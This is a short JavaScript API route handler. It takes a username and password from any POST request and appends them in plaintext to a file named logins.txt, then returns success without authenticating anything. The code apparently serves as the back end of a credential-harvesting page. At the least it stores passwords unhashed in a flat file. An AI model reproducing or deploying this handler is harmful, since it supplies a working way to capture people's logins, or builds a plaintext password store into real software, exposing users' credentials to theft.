const fs = require('fs');

export default function handler(req, res) {
  if (req.method === 'POST') {
    const { username, password } = req.body;

    // Save credentials to logins.txt
    fs.appendFile('logins.txt', `Username: ${username}, Password: ${password}\n`, (err) => {
      if (err) {
        res.status(500).json({ success: false });
      } else {
        res.status(200).json({ success: true });
      }
    });
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}
